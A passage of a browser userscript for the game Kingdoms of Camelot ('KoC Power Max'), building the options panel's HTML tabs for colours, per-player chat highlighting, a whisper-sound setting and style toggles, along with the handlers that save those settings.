		// t.togpdxSO ('togmodChatlistBoarder', 'modChatlistBoarder'); 		<TR><TD><INPUT id=togmodChatlistBoarder type=checkbox /></td><TD>Neuer Chat Style</td></tr>
		
	t.changeColorOpt ('togTabWidth', 'TabWidth');
	t.changeColorOpt ('togWideScreenWidth', 'WideScreenWidth');
		document.getElementById('pbchatWidth').addEventListener ('change', function () {
	     var x = document.getElementById('pbchatWidth').value;
	    if (isNaN(x) || x<600 || x>1000){
	     document.getElementById('pbchatWidth').value = 700; 
	    }
	    Options.chatWidth = x;
	    saveOptions();
      }, false);
//'+culang.Opbchattop +' <INPUT id=pbchattop type=text size=3 maxlength=6 \> '+culang.left+' <INPUT id=pbchatleft type=text size=3 maxlength=6 \> '+culang.Ochathigh+': <INPUT id=pbchathoehel type=text size=3 maxlength=6 \>
//<span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.Opositionimp+'</span>
	// t.changeOpt ('pbchattop', 'chatTop');
	// t.changeOpt ('pbchatleft', 'chatLeft');	
	// 
	//t.changeOpt ('pbchathoehe', 'chatHoehe');  '+culang.Oboarderhigh+': <INPUT id=pbchathoehe type=text size=3 maxlength=6 \> 
	//t.changeOpt ('pbchathoehel', 'chatHoeheL');
	

    } catch (e) {
    }
  },
/**********************************************************/
/************ KOC POWER - SUBTABS COLOR ***************OK*/
/********************************************************/
  showColors : function (){
    var t = Tabs.Options;
    try { name
	m = '<DIV style=" max-height:750px;"><div class=pdxStat>'+culang.Hcolors+' '+culang.Handstyle+' </div><TABLE width=95%>\
		<TR><TD ><b><u>1.'+culang.general+'</u></b></td><TD width="113"><b><u>1.1 '+culang.colors+'</u></b></td><TD colspan="2"><b><u>2 '+culang.chat+'</u></b></td><TD width="113"><u><b>2.1 '+culang.colors+'</b></u></td></tr>\
		<TR><TD width="334">'+culang.OtogChatMainTitle+'</td><TD width="113"><INPUT  style="background:'+Colors.MainTitle+'" type=text id=togChatMainTiltle value="'+Colors.MainTitle+'" size=7 maxlength=7></td><TD width="29"><INPUT type=checkbox id=togLowFoodBGsel /></td><TD width="239">'+culang.OLowFoodAlert+'</td><TD  width="113"><INPUT style="background:'+Colors.lowFoodBG+'" type=text id=toglowFoodBG value="'+Colors.lowFoodBG+'" size=7 maxlength=7></td></tr>\
		<TR><TD >'+culang.OtogChatMainTiltleSch +'</td><TD width="113" ><INPUT style="background:'+Colors.MainTitleSch+'" type=text id=togChatMainTiltleSch value="'+Colors.MainTitleSch+'" size=7 maxlength=7></td><TD ><INPUT type=checkbox id=togChatLead /></td><TD >'+culang.OtogChatLeaders+'</td><TD  width="113" ><INPUT style="background:'+Colors.ChatLeader+'" type=text id=togChatLeaders value="'+Colors.ChatLeader+'" size=7 maxlength=7></td></tr>\
		<TR><TD>'+culang.OtogStatsU+'</td><TD width="113"><INPUT type=text style="background:'+Colors.StatsU+'"  id=togStatsU value="'+Colors.StatsU+'" size=7 maxlength=7></td><TD><INPUT type=checkbox id=togChatAttack /></td><TD>'+culang.OtoggChatAngriff+'</td><TD width="113" ><INPUT type=text style="background:'+Colors.ChatAngriff+'" id=toggChatAngriff value="'+Colors.ChatAngriff+'" size=7 maxlength=7></td></tr>\
		<TR><TD >'+culang.OtogDarkRow +': </td><TD width="113" ><INPUT  style="background:'+Colors.DarkRow+'" type=text id=togDarkRow value="'+Colors.DarkRow+'" size=7 maxlength=7></td><TD ><INPUT type=checkbox id=togChatWhisper /></td><TD >'+culang.OtogChatWhisper+'</td><TD width="113" ><INPUT style="background:'+Colors.WhisperBG+'" type=text id=togWhisperBG value="'+Colors.WhisperBG+'" size=7 maxlength=7></td></tr>\
		<TR><TD>'+culang.OtogButClick+': </td><TD   width="113"><INPUT style="background:'+Colors.ButtonSelected+'" type=text id=togButClick value="'+Colors.ButtonSelected+'" size=7 maxlength=7></td><TD><INPUT type=checkbox id=togWildAttacksel /></td><TD>'+culang.OtogWildAttack+'</td><TD width="113" ><INPUT style="background:'+Colors.WildAttack+'" type=text id=togWildAttack value="'+Colors.WildAttack+'" size=7 maxlength=7></td></tr>\
		<TR><TD >'+culang.OtogOverDarkRow+'</td><TD width="113" ><INPUT  style="background:'+Colors.OverviewDarkRow+'" type=text id=togOverDarkRow value="'+Colors.OverviewDarkRow+'" size=7 maxlength=7></td><TD >&nbsp;</td><TD >&nbsp;</td><TD>&nbsp;</td></tr>\
		<TR><TD >'+culang.OtogMainPop +':</td>	<TD  width="113"><INPUT style="background:'+Colors.MainPop+'" type=text id=togMainPop value="'+Colors.MainPop+'" size=7 maxlength=7></td><TD>&nbsp;</td><TD>&nbsp;</td><TD >&nbsp;</td></tr>\
		<TR><TD >'+culang.OtogTabHinPop+'</td><TD width="113" ><INPUT type=text style="background:'+Colors.TabHinPop+'" id=togTabHinPop value="'+Colors.TabHinPop+'" size=7 maxlength=7></td><TD colspan="2" >'+culang.OtogTabTrans +'</td><TD><INPUT type=text id=togTabTrans value="'+Colors.TabTrans+'" size=3 maxlength=3></td></tr>\
		<TR><TD>'+culang.tournament+' - '+culang.tab+' </td><TD><INPUT type=text id=togTournament style="background:'+Colors.Tourn+'" value="'+Colors.Tourn+'" size=7 maxlength=7></td><TD colspan="3"><span class=boldRed><u>'+culang.OHattention+'</u></span><b>: '+culang.OattentionImp+'</b></td></tr>\
		<TR><TD >'+culang.OtogstyleRows+'</td><TD ><INPUT style="background:'+Colors.styleRows+'" type=text id=togstyleRows value="'+Colors.styleRows+'" size=7 maxlength=7></td><TD colspan="2" >&nbsp;</td><TD >&nbsp;</td></tr>\
		<TR><TD>'+culang.OtogscToolbarBG +' #1</td><TD width="113" ><INPUT type=text style="background:'+Colors.scToolbarBG+'" id=togscToolbarBG value="'+Colors.scToolbarBG+'" size=7 maxlength=7></td><TD colspan="2" ></td><TD></td></tr>\
		<TR><TD >'+culang.OtogscToolbarBG+' #2</td><TD width="113" ><INPUT style="background:'+Colors.scToolbarBG2+'" type=text id=togscToolbarBG2 value="'+Colors.scToolbarBG2+'" size=7 maxlength=7></td><TD colspan="2">&nbsp;</td><TD width="113">&nbsp;</td></tr>\
		<TR><TD >'+culang.shadowCol+'</td><TD width="113" ><INPUT style="background:'+Colors.OptShadowCol+'" type=text id=togOptShadowCol value="'+Colors.OptShadowCol+'" size=7 maxlength=7></td><TD colspan="3">'+culang.size+' <INPUT type=text id=togOptShadow value="'+Colors.OptShadow+'" size=3 maxlength=1> <b>('+culang.max+'. 1-9 | 0 = '+culang.buttonoff+' <b>)</b></td></tr>\
		</table><center>'+ strButton20(''+culang.ObtnResetAllColors+'', 'id=togResetColors') +' '+culang.colorResetNote+'</center><HR><span class=boldRed><u>'+culang.impo+'</u>:</span>'+culang.OstyleChangeRefresh+'</div>';

	t.optionsDiv.innerHTML = m;
	t.togOpt ('togChatWhisper', 'chatwhisper');		t.togOpt ('togWildAttacksel', 'chatWildAttack');	t.togOpt ('togChatLead', 'chatLeaders');	t.togOpt ('togLowFoodBGsel', 'enableFoodChatAlertBG');	t.togOpt ('togChatAttack', 'chatAttack');
	t.changeColor ('toglowFoodBG', 'lowFoodBG');	t.changeColor ('togWhisperBG', 'WhisperBG');	t.changeColor ('togTournament', 'Tourn');	t.changeColor ('togChatLeaders', 'ChatLeader');	t.changeColor ('togChatMainTiltle', 'MainTitle');	t.changeColor ('togChatMainTiltleSch', 'MainTitleSch');	t.changeColor ('togOptShadow', 'OptShadow');	t.changeColor ('togOptShadowCol', 'OptShadowCol');	t.changeColor ('togDarkRow', 'DarkRow');	t.changeColor ('togButClick', 'ButtonSelected');	t.changeColor ('togOverDarkRow', 'OverviewDarkRow'); t.changeColor ('toggChatAngriff', 'ChatAngriff');	t.changeColor ('togWildAttack', 'WildAttack');	t.changeColor ('togTabHinPop', 'TabHinPop');	t.changeColor ('togMainPop', 'MainPop');	t.changeColor ('togTabTrans', 'TabTrans');	t.changeColor ('togStatsU', 'StatsU');	t.changeColor ('togscToolbarBG', 'scToolbarBG');	t.changeColor ('togscToolbarBG2', 'scToolbarBG2'); t.changeColor ('togstyleRows', 'styleRows');

	document.getElementById('togResetColors').addEventListener ('click', function(){
	var serverID = getServerId();
		RemoveList = (GM_listValues());
		for (i=0;i<RemoveList.length;i++){
			if (RemoveList[i] == "Colors_"+serverID) GM_deleteValue(RemoveList[i]);
		}
		ResetColors=true;
		reloadKOC();
	},false);
	
    } catch (e) {

    }
  },
/**********************************************************/
/************ KOC POWER - SUBTABS PLYER COLORS ********OK*/
/********************************************************/  
showPlayers : function (){
    var t = Tabs.Options;
    try { 1
	m = '<DIV style=" max-height:750px;"><div class=pdxStat>'+culang.HnickOpt+'</div>\
		<table width="667" border="0" cellspacing="0" cellpadding="0"><TR><TD width="182"><b><u>1.'+culang.playersound+'</u></b></td><TD width="106" ><b><u>'+culang.vol+'</u></b></td><TD width="271" ><u><b>'+culang.playersoundurl+'</b></u></td><TD width="108">&nbsp;</td></tr>		<TR><TD><INPUT type=checkbox id=togPlayerSound1 /><INPUT type=text id=toguserNameSou1 value="'+ Options.userNameSou1 +'"></td><TD><INPUT type=textbox id=togURLsonUsr1vol value="'+ Options.URLsonUsr1vol +'" size=3 /></td><TD><INPUT type=textbox id=togURLsonUsr1 value="'+ Options.URLsonUsr1 +'" size=45 /></td><TD><input type=button id="PDXDefURLUsr1" value="'+culang.reset+'"></td></tr>		<TR><TD><INPUT type=checkbox id=togNickColor /> '+culang.colors1+'</td><TD ><INPUT style="background:'+Colors.userBGUsrSou1+'" type=text id=toguserBGUsrSou1 value="'+Colors.userBGUsrSou1+'" size=7 maxlength=7></td><TD>&nbsp;</td><TD>&nbsp;</td></tr>\
		</table><div class=pdxStat>'+culang.HplayerOpt+'</div>\
		<table width="100%" border="0" cellspacing="0" cellpadding="0"><TR><TD colspan="2" ><b><u>'+culang.player+' '+culang.colors+'</u></b> </td><TD width="153" ><b><u>'+culang.name+'</u></b></td><TD colspan="2" ><b><u>'+culang.player+' '+culang.colors+'</u></b> </td><TD width="144" ><u><b>'+culang.name+'</b></u></td></tr>		<TR><TD width="200" ><INPUT  type=checkbox id=ptEnableUserName1 />  '+culang.player+' #1 </td><TD  width="44" ><INPUT  style="background:'+Colors.userBG1+'" type=text id=toguserBG1 value="'+Colors.userBG1+'" size=7 maxlength=7></td><TD><input type=text id=togcolorUserName1 value="'+ Options.userName1 +'"></td><TD width="200" ><INPUT  type=checkbox id=ptEnableUserName16 /> '+culang.player+' #16 </td><TD  width="44" ><INPUT  style="background:'+Colors.userBG16+'" type=text id=toguserBG16 value="'+Colors.userBG16+'" size=7 maxlength=7></td><TD><input type=text id=togcolorUserName16 value="'+ Options.userName16 +'"></td></tr>		<TR><TD ><INPUT  type=checkbox id=ptEnableUserName2 /> '+culang.player+' #2 </td><TD  ><INPUT style="background:'+Colors.userBG2+'" type=text id=toguserBG2 value="'+Colors.userBG2+'" size=7 maxlength=7></td><TD ><INPUT  type=text id=togcolorUserName2 value="'+ Options.userName2 +'"></td><TD ><INPUT  type=checkbox id=ptEnableUserName17 />'+culang.player+' #17 </td><TD ><INPUT  style="background:'+Colors.userBG17+'"  type=text id=toguserBG17 value="'+Colors.userBG17+'" size=7 maxlength=7></td><TD ><INPUT  type=text id=togcolorUserName17 value="'+ Options.userName17 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName3 /> '+culang.player+' #3</td><TD ><INPUT style="background:'+Colors.userBG3+'" type=text id=toguserBG3 value="'+Colors.userBG3+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName3 value="'+ Options.userName3 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName18 /> '+culang.player+' #18 </td><TD ><INPUT style="background:'+Colors.userBG18+'" type=text id=toguserBG18 value="'+Colors.userBG18+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName18 value="'+ Options.userName18 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName4 /> '+culang.player+' #4 </td><TD  ><INPUT style="background:'+Colors.userBG4+'" type=text id=toguserBG4 value="'+Colors.userBG4+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName4 value="'+ Options.userName4 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName19 />'+culang.player+' #19 </td><TD><INPUT  style="background:'+Colors.userBG19+'"  type=text id=toguserBG19 value="'+Colors.userBG19+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName19 value="'+ Options.userName19+'"></td></tr>		<TR ><TD><INPUT type=checkbox id=ptEnableUserName5 /> '+culang.player+' #5 </td><TD ><INPUT style="background:'+Colors.userBG5+'" type=text id=toguserBG5 value="'+Colors.userBG5+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName5 value="'+ Options.userName5 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName20 />'+culang.player+' #20 </td><TD ><INPUT style="background:'+Colors.userBG20+'" type=text id=toguserBG20 value="'+Colors.userBG20+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName20 value="'+ Options.userName20 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName6 /> '+culang.player+' #6 </td><TD ><INPUT style="background:'+Colors.userBG6+'" type=text id=toguserBG6 value="'+Colors.userBG6+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName6 value="'+ Options.userName6 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName21 /> '+culang.player+' #21 </td><TD ><INPUT style="background:'+Colors.userBG21+'" type=text id=toguserBG21 value="'+Colors.userBG21+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName21 value="'+ Options.userName21 +'"></td></tr>		<TR ><TD><INPUT  type=checkbox id=ptEnableUserName7 /> '+culang.player+' #7 </td><TD ><INPUT style="background:'+Colors.userBG7+'" type=text id=toguserBG7 value="'+Colors.userBG7+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName7 value="'+ Options.userName7 +'"></td><TD><INPUT  type=checkbox id=ptEnableUserName22 /> '+culang.player+' #22</td><TD ><INPUT style="background:'+Colors.userBG22+'" type=text id=toguserBG22 value="'+Colors.userBG22+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName22 value="'+ Options.userName22 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName8 /> '+culang.player+' #8 </td><TD ><INPUT style="background:'+Colors.userBG8+'" type=text id=toguserBG8 value="'+Colors.userBG8+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName8 value="'+ Options.userName8 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName23 />     '+culang.player+' #23 </td><TD ><INPUT style="background:'+Colors.userBG23+'" type=text id=toguserBG23 value="'+Colors.userBG23+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName23 value="'+ Options.userName23 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName9 /> '+culang.player+' #9 </td><TD ><INPUT style="background:'+Colors.userBG9+'" type=text id=toguserBG9 value="'+Colors.userBG9+'" size=7 maxlength=7></td><TD ><input type=text id=togcolorUserName9 value="'+ Options.userName9 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName24 />     '+culang.player+' #24 </td><TD ><INPUT style="background:'+Colors.userBG24+'" type=text id=toguserBG24 value="'+Colors.userBG24+'" size=7 maxlength=7></td><TD ><input type=text id=togcolorUserName24 value="'+ Options.userName24 +'"></td></tr>		<TR ><TD><INPUT type=checkbox id=ptEnableUserName10 /> '+culang.player+' #10 </td><TD ><INPUT style="background:'+Colors.userBG10+'" type=text id=toguserBG10 value="'+Colors.userBG10+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName10 value="'+ Options.userName10 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName25 /> '+culang.player+' #25 </td><TD ><INPUT style="background:'+Colors.userBG25+'" type=text id=toguserBG25 value="'+Colors.userBG25+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName25 value="'+ Options.userName25 +'"></td></tr>		<TR ><TD width="180" ><INPUT  type=checkbox id=ptEnableUserName11 /> '+culang.player+' #11 </td><TD  width="44" ><INPUT style="background:'+Colors.userBG11+'" type=text id=toguserBG11 value="'+Colors.userBG11+'" size=7 maxlength=7></td><TD><input type=text id=togcolorUserName11 value="'+ Options.userName11 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName26 /> '+culang.player+' #26 </td><TD ><INPUT style="background:'+Colors.userBG26+'" type=text id=toguserBG26 value="'+Colors.userBG26+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName26 value="'+ Options.userName26 +'"></td></tr>		<TR ><TD ><INPUT  type=checkbox id=ptEnableUserName12 />'+culang.player+' #12 </td><TD  ><INPUT style="background:'+Colors.userBG12+'" type=text id=toguserBG12 value="'+Colors.userBG12+'" size=7 maxlength=7></td><TD ><INPUT  type=text id=togcolorUserName12 value="'+ Options.userName12 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName27 /> '+culang.player+' #27 </td><TD ><INPUT style="background:'+Colors.userBG27+'" type=text id=toguserBG27 value="'+Colors.userBG27+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName27 value="'+ Options.userName27 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName13 />'+culang.player+' #13 </td><TD ><INPUT style="background:'+Colors.userBG13+'" type=text id=toguserBG13 value="'+Colors.userBG13+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName13 value="'+ Options.userName13 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName28 /> '+culang.player+' #28 </td><TD ><INPUT  style="background:'+Colors.userBG28+'" type=text id=toguserBG28 value="'+Colors.userBG28+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName28 value="'+ Options.userName28 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName14 /> '+culang.player+' #14 </td><TD ><INPUT style="background:'+Colors.userBG14+'" type=text id=toguserBG14 value="'+Colors.userBG14+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName14 value="'+ Options.userName14 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName29 /> '+culang.player+' #29 </td><TD><INPUT  style="background:'+Colors.userBG29+'" type=text id=toguserBG29 value="'+Colors.userBG29+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName29 value="'+ Options.userName29 +'"></td></tr>		<TR ><TD><INPUT type=checkbox id=ptEnableUserName15 />     '+culang.player+' #15  </td><TD ><INPUT style="background:'+Colors.userBG15+'" type=text id=toguserBG15 value="'+Colors.userBG15+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName15 value="'+ Options.userName15 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName30 /> '+culang.player+' #30 </td><TD ><INPUT style="background:'+Colors.userBG30+'" type=text id=toguserBG30 value="'+Colors.userBG30+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName30 value="'+ Options.userName30 +'"></td></tr>\
		</table></div>';

	t.optionsDiv.innerHTML = m;
	t.changePlayerCol ('toguserBG1', 'userBG1'); t.changePlayerCol ('toguserBG2', 'userBG2'); t.changePlayerCol ('toguserBG3', 'userBG3'); t.changePlayerCol ('toguserBG4', 'userBG4'); t.changePlayerCol ('toguserBG5', 'userBG5'); t.changePlayerCol ('toguserBG6', 'userBG6'); t.changePlayerCol ('toguserBG7', 'userBG7'); t.changePlayerCol ('toguserBG8', 'userBG8'); t.changePlayerCol ('toguserBG9', 'userBG9'); t.changePlayerCol ('toguserBG10', 'userBG10'); t.changePlayerCol ('toguserBG11', 'userBG11'); t.changePlayerCol ('toguserBG12', 'userBG12'); t.changePlayerCol ('toguserBG13', 'userBG13'); t.changePlayerCol ('toguserBG14', 'userBG14'); t.changePlayerCol ('toguserBG15', 'userBG15'); t.changePlayerCol ('toguserBG16', 'userBG16'); t.changePlayerCol ('toguserBG17', 'userBG17'); t.changePlayerCol ('toguserBG18', 'userBG18'); t.changePlayerCol ('toguserBG19', 'userBG19'); t.changePlayerCol ('toguserBG20', 'userBG20'); t.changePlayerCol ('toguserBG21', 'userBG21'); t.changePlayerCol ('toguserBG22', 'userBG22'); t.changePlayerCol ('toguserBG23', 'userBG23'); t.changePlayerCol ('toguserBG24', 'userBG24'); t.changePlayerCol ('toguserBG25', 'userBG25'); t.changePlayerCol ('toguserBG26', 'userBG26'); t.changePlayerCol ('toguserBG27', 'userBG27'); t.changePlayerCol ('toguserBG28', 'userBG28'); t.changePlayerCol ('toguserBG29', 'userBG29');	t.changePlayerCol ('toguserBG30', 'userBG30');	
	t.changeOpt ('togcolorUserName1', 'userName1'); t.changeOpt ('togcolorUserName2', 'userName2'); t.changeOpt ('togcolorUserName3', 'userName3'); t.changeOpt ('togcolorUserName4', 'userName4'); t.changeOpt ('togcolorUserName5', 'userName5'); t.changeOpt ('togcolorUserName6', 'userName6'); t.changeOpt ('togcolorUserName7', 'userName7'); t.changeOpt ('togcolorUserName8', 'userName8'); t.changeOpt ('togcolorUserName9', 'userName9'); t.changeOpt ('togcolorUserName10', 'userName10'); t.changeOpt ('togcolorUserName11', 'userName11'); t.changeOpt ('togcolorUserName12', 'userName12'); t.changeOpt ('togcolorUserName13', 'userName13'); t.changeOpt ('togcolorUserName14', 'userName14'); t.changeOpt ('togcolorUserName15', 'userName15'); t.changeOpt ('togcolorUserName16', 'userName16'); t.changeOpt ('togcolorUserName17', 'userName17'); t.changeOpt ('togcolorUserName18', 'userName18'); t.changeOpt ('togcolorUserName19', 'userName19'); t.changeOpt ('togcolorUserName20', 'userName20'); t.changeOpt ('togcolorUserName21', 'userName21'); t.changeOpt ('togcolorUserName22', 'userName22'); t.changeOpt ('togcolorUserName23', 'userName23'); t.changeOpt ('togcolorUserName24', 'userName24'); t.changeOpt ('togcolorUserName25', 'userName25'); t.changeOpt ('togcolorUserName26', 'userName26'); t.changeOpt ('togcolorUserName27', 'userName27'); t.changeOpt ('togcolorUserName28', 'userName28'); t.changeOpt ('togcolorUserName29', 'userName29');	t.changeOpt ('togcolorUserName30', 'userName30');
	t.togOpt ('ptEnableUserName1', 'enableUserName1'); t.togOpt ('ptEnableUserName2', 'enableUserName2'); t.togOpt ('ptEnableUserName3', 'enableUserName3'); t.togOpt ('ptEnableUserName4', 'enableUserName4'); t.togOpt ('ptEnableUserName5', 'enableUserName5'); t.togOpt ('ptEnableUserName6', 'enableUserName6'); t.togOpt ('ptEnableUserName7', 'enableUserName7'); t.togOpt ('ptEnableUserName8', 'enableUserName8'); t.togOpt ('ptEnableUserName9', 'enableUserName9'); t.togOpt ('ptEnableUserName10', 'enableUserName10');	t.togOpt ('ptEnableUserName11', 'enableUserName11'); t.togOpt ('ptEnableUserName12', 'enableUserName12'); t.togOpt ('ptEnableUserName13', 'enableUserName13'); t.togOpt ('ptEnableUserName14', 'enableUserName14'); t.togOpt ('ptEnableUserName15', 'enableUserName15'); t.togOpt ('ptEnableUserName16', 'enableUserName16'); t.togOpt ('ptEnableUserName17', 'enableUserName17'); t.togOpt ('ptEnableUserName18', 'enableUserName18'); t.togOpt ('ptEnableUserName19', 'enableUserName19'); t.togOpt ('ptEnableUserName20', 'enableUserName20'); t.togOpt ('ptEnableUserName21', 'enableUserName21'); t.togOpt ('ptEnableUserName22', 'enableUserName22'); t.togOpt ('ptEnableUserName23', 'enableUserName23'); t.togOpt ('ptEnableUserName24', 'enableUserName24'); t.togOpt ('ptEnableUserName25', 'enableUserName25'); t.togOpt ('ptEnableUserName26', 'enableUserName26'); t.togOpt ('ptEnableUserName27', 'enableUserName27'); t.togOpt ('ptEnableUserName28', 'enableUserName28'); t.togOpt ('ptEnableUserName29', 'enableUserName29'); t.togOpt ('ptEnableUserName30', 'enableUserName30');
	t.changeOpt ('toguserNameSou1', 'userNameSou1'); t.changeOpt ('togURLsonUsr1', 'URLsonUsr1'); t.changeOpt ('togURLsonUsr1vol', 'URLsonUsr1vol');	t.changePlayerCol ('toguserBGUsrSou1', 'userBGUsrSou1');
	t.togOpt ('togNickColor', 'enableNickColor'); t.togOpt ('togPlayerSound1', 'enableUsr1Sound');

	document.getElementById("PDXDefURLUsr1").addEventListener ('click', function () {
		Options.URLsonUsr1 = 'http://koc.god-like.info/fluestersound.mp3';
		document.getElementById('togURLsonUsr1').value='http://koc.god-like.info/fluestersound.mp3';
		saveOptions();
	}, false);
	
    } catch (e) {    }
  },
/**********************************************************/
/************ KOC POWER - SUBTABS STYLE ******************/
/********************************************************/
   showStyle : function (){
    var t = Tabs.Options;
    try {
      m = '<DIV style=" max-height:750px;"><div class=pdxStat>'+culang.HkpwerSS+'</div><table class=pdxTab>\
		<tr><td  colspan="2"><b><u>1. '+culang.OButtons +'</u></b></td><td colspan="2"><b><u>2. '+culang.auto+' '+culang.OButtons+'</u></b></td><td colspan="2"><u><b>4. '+culang.OChatstyle +'</b></u></td></tr>\
		<tr><td width="20"><INPUT id=togNeueNachricht type=checkbox /></td><td width="206">'+culang.composemessages+'</td><td><INPUT id=togATransport type=checkbox /></td><td>'+culang.atransport+'</td><td width="20"><INPUT id=togChatStuff type=checkbox /></td><td width="343">'+culang.OtogChatStuff +' <SPAN class=boldRed>('+culang.OChatStuffNote+')</span></td></tr>\
		<tr><td><INPUT id=togMeineBerichte type=checkbox /></td><td>'+culang.viewmessages+'</td><td><INPUT id=togANeuzuordnen type=checkbox /></td><td>'+culang.autoreassign+'</td><td colspan="2"><b><u>5. '+culang.OscSettings+'</u></b> <span class=boldRed>(need fix)</span> </td></tr>\
		<tr><td height="22"><INPUT id=togAllianzBerichte type=checkbox /></td><td>'+culang.alliancereports+'</td><td><INPUT type=checkbox id=togscCrest /></td><td>'+culang.crest+'</td><td><INPUT id=togHideKoCBar type=checkbox /></td><td>'+culang.hideKoCBar+' </td></tr>\
		<tr><td><INPUT id=togVerstaerken type=checkbox /></td><td>'+culang.reinforce+' </td><td><INPUT type=checkbox id=togscDF /></td><td>'+culang.darkforest+'</td><td><INPUT type=checkbox id=toghideFriends /></td><td>'+culang.knightlist+' </td></tr>\
		<tr><td><INPUT id=togNeuzuordnen type=checkbox /></td><td>'+culang.reassign+'</td><td><INPUT type=checkbox id=togscRaidReset /></td><td>'+culang.raidreset+'</td><td><INPUT id=toghideKoCHeader type=checkbox /></td><td>'+culang.hideKoCHeader+'</td></tr>\
		<tr><td><INPUT type=checkbox id=togTransport /></td><td>'+culang.transport+'</td><td><INPUT id=togAutoRefresh type=checkbox /></td><td>'+culang.arefresh+'</td><td><INPUT id=togKoCBottomStuff type=checkbox /></td><td>'+culang.hideKoCBottom+'</td></tr>\
		<tr><td><INPUT type=checkbox id=togWiederholen /></td><td>'+culang.repeat+'</td><td width="23"><INPUT type=checkbox id=togAutoBau /></td><td width="253">'+culang.autobuild+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td colspan="2"><b><u>3. '+culang.shortcutExtras+'</u></b></td><td><INPUT type=checkbox id=togMakieren /></td><td>'+culang.buildmode+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td><INPUT type=checkbox id=togLinebreak /></td><td><u>'+culang.linebreak+'</u></td><td><INPUT type=checkbox id=togHilfe /></td><td>'+culang.askhelp+'</td><td></td><td>&nbsp;</td></tr>\
		<tr><td><INPUT type=checkbox id=togSeperator1 /></td><td>'+culang.seperator+' - '+culang.scToolbar+' </td><td><INPUT type=checkbox id=togscAutoTrain /></td><td>'+culang.autotrain+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td><INPUT type=checkbox id=togSeperator2 /></td><td>'+culang.seperator+' - '+culang.auto+' </td><td><INPUT type=checkbox id=togscCrafting /></td><td>'+culang.crafting+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td>&nbsp;</td><td>&nbsp;</td><td><INPUT type=checkbox id=togStopSound /></td><td>'+culang.stopsound+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		</table><HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Powered by KoC Power MulitLang Version 1.2.4 by PDX, Re-edited by Larry W. Harrell </a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Power Max Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <BR><BR><BR></a></span></center></td>\
           </table></div>';

		   
	t.optionsDiv.innerHTML = m;

	t.togOpt ('togHideKoCBar', 'hideKoCBar');	t.togOpt ('toghideKoCHeader', 'hideKoCHeader');	t.togOpt ('togKoCBottomStuff', 'hideShowKoCBottomStuff');	t.togOpt ('toghideFriends', 'hideFriends');
	t.togOpt ('togSeperator1', 'scSeperator1');	t.togOpt ('togSeperator2', 'scSeperator2');	t.togOpt ('togLinebreak', 'scLinebreak');
	t.togOpt ('togChatStuff', 'chatEnhance', ChatStuffE.setEnable, ChatStuffE.isAvailable);

